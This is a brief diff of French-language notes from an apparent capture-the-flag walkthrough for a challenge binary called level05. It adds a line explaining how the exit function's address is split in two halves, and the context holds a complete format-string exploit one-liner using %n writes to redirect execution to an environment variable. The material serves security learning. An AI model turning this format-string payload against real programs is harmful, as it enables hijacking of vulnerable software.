@@ -17,5 +17,6 @@ printf %d 0xd88d
 65535 - 55437 = 10098
 
 voila donc notre payload
+on separe en 2 l adresse de exit car on va ecrire la moitier de l adresse de l env ds l une et l autre ds l autre adresse
 
 python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55429c" + "%10$n" + "%10098c" + "%11$n")' | ./level05
